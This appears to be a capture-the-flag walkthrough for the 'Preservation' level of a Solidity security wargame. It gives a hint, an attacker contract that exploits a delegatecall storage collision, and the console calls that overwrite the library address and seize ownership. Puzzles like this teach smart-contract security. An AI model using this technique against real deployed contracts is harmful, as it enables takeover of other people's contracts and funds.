# Preservation

**HINT:** Look back at Delegation and Privacy on how data is stored.
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.5;

contract PreservationAttack {
    address slot0;
    address slot1;
    address slot2;
   
 function setTime(uint _time) public {
    slot2 = msg.sender;
  }
}
``` 
Once deployed you can see in th Preservation contract's abi that it has a setFirstTime function that accepts addresses so you can change the address in slot0(timeZone1Library) to your contract address like so:

```js
await contract.setFirstTime('Your_Deployed_Contract_address')
```
Now that slot0(timeZone1Library) is your contract if you call ```.setFirstTime``` again with your player address it will set slot2(Owner) to you, making you the owner now
<br></br>
You can double check you are the owner now with:

```js
await contract.owner()
````